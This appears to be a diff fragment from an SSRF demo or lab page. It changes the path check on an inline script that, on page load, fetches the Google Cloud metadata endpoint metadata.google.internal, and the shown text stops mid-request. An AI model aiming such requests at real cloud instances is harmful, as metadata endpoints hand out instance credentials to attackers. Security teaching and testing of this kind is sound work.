@@ -9,7 +9,7 @@
 
     <script>
         document.addEventListener('DOMContentLoaded', (event) => {
-            if (window.location.pathname === '/ssrf') {
+            if (window.location.pathname === '/ssrf/') {
                 fetch('http://metadata.google.internal', {
                     method: 'GET',
                     headers: {
